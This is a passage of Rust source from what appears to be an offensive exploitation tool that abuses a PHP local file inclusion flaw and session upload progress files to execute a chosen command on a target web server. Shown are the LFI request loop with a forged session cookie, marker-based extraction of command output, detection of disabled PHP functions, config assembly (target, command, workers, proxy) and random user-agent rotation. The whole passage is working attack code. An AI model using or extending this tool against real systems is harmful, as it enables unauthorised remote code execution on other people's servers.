) -> Result<Option<(String, bool)>, String> {
    let req = client
        .get(url)
        .header(reqwest::header::COOKIE, build_cookie_header(cfg));

    let mut resp: HttpResponse = req.send().map_err(|e| e.to_string())?;

    if cfg.verbose {
        let st = resp.status().as_u16();
        if st != 200 || !*first_logged {
            eprintln!("[w{}] LFI {} -> {}", worker, url, st);
            if st == 200 {
                *first_logged = true;
            }
        }
    }

    let mut bytes = Vec::new();
    let mut chunk = [0u8; 8192];
    loop {
        let n = resp.read(&mut chunk).map_err(|e| e.to_string())?;
        if n == 0 {
            break;
        }
        bytes.extend_from_slice(&chunk[..n]);
        if bytes.len() >= MAX_LFI_BODY {
            bytes.truncate(MAX_LFI_BODY);
            break;
        }
    }
    let body = String::from_utf8_lossy(&bytes);

    if let Some(out) = extract_execution(&body, &cfg.marker) {
        let disabled = DISABLED_FN_MARKERS
            .iter()
            .any(|d| out.to_lowercase().contains(d));
        let out = if out.is_empty() {
            "[executed — empty output]".to_string()
        } else {
            out
        };
        return Ok(Some((out, disabled)));
    }
    Ok(None)
}

/// Require two markers bracketing the output, preferring the last adjacent pair
/// so reflection + execution both appearing doesn't extract the wrong span.
fn extract_execution(body: &str, marker: &str) -> Option<String> {
    let idx: Vec<usize> = body.match_indices(marker).map(|(i, _)| i).collect();
    if idx.len() < 2 {
        return None;
    }
    let a = idx[idx.len() - 2];
    let b = idx[idx.len() - 1];
    if b <= a + marker.len() || b - a > MAX_MARKER_SPAN {
        return None;
    }
    Some(body[a + marker.len()..b].to_string())
}

// ============================================================
// Config assembly
// ============================================================

fn build_config(cli: Cli) -> Result<Config, String> {
    validate_no_crlf("--param", &cli.param)?;
    validate_no_crlf("--progress-field", &cli.progress_field)?;
    validate_no_crlf("--session-name", &cli.session_name)?;

    let url = Url::parse(&cli.target).map_err(|e| format!("bad target URL: {}", e))?;
    let https = match url.scheme() {
        "https" => true,
        "http" => false,
        other => return Err(format!("unsupported scheme '{}'", other)),
    };
    let host = url.host_str().ok_or("URL missing host")?.to_string();
    let port = url.port_or_known_default().ok_or("cannot determine port")?;
    let post_path = cli.post_path.clone().unwrap_or_else(|| {
        let p = url.path();
        if p.is_empty() { "/".to_string() } else { p.to_string() }
    });

    // Merge `--header "Cookie: ..."` into --cookie; reject duplicates at source.
    let mut cookie_parts: Vec<String> = Vec::new();
    if let Some(c) = &cli.cookie {
        cookie_parts.push(c.clone());
    }
    let mut filtered_headers: Vec<String> = Vec::new();
    for h in &cli.headers {
        if let Some((k, v)) = h.split_once(':') {
            if k.trim().eq_ignore_ascii_case("cookie") {
                cookie_parts.push(v.trim().to_string());
                continue;
            }
        }
        filtered_headers.push(h.clone());
    }
    let cookie = if cookie_parts.is_empty() {
        None
    } else {
        Some(cookie_parts.join("; "))
    };

    let sid_charset = SidCharset::parse(&cli.sid_charset)?;
    let (sid, sid_explicit) = match cli.sid.clone() {
        Some(s) => (s, true),
        None => (random_sid(cli.sid_length, sid_charset), false),
    };

    let user_agent = cli.user_agent.clone().unwrap_or_else(random_ua);

    Ok(Config {
        target: cli.target,
        host,
        port,
        https,
        post_path,
        user_agent,
        stall: Duration::from_millis(cli.stall),
        timeout: Duration::from_secs(cli.timeout),
        progress_field: cli.progress_field,
        cmd: cli.cmd,
        param: cli.param,
        sid,
        sid_explicit,
        sid_length: cli.sid_length,
        sid_charset,
        session_name: cli.session_name,
        insecure: cli.insecure,
        verbose: cli.verbose,
        dry_run: cli.dry_run,
        lfi_template: cli.lfi,
        lfi_workers: cli.lfi_workers.max(1),
        lfi_interval: Duration::from_millis(cli.lfi_interval),
        lfi_max_requests: cli.lfi_max_requests.max(1),
        cookie,
        headers: filtered_headers,
        proxy: cli.proxy,
        output_json: cli.output,
        skip_fingerprint: cli.skip_fingerprint,
        marker: format!("PFMARK_{}", random_alnum(8)),
        retries: cli.retries.max(1),
    })
}

fn validate_no_crlf(field: &str, value: &str) -> Result<(), String> {
    if value.contains('\r') || value.contains('\n') {
        return Err(format!("{} must not contain CR/LF", field));
    }
    Ok(())
}

// ============================================================
// Utilities
// ============================================================

fn random_alnum(n: usize) -> String {
    rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(n)
        .map(char::from)
        .collect()
}

fn random_sid(len: usize, charset: SidCharset) -> String {
    let chars = charset.chars();
    let mut rng = rand::thread_rng();
    (0..len)
        .map(|_| chars[rng.gen_range(0..chars.len())] as char)
        .collect()
}

fn random_ua() -> String {
    const UAS: &[&str] = &[
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    ];
    UAS[rand::thread_rng().gen_range(0..UAS.len())].to_string()
}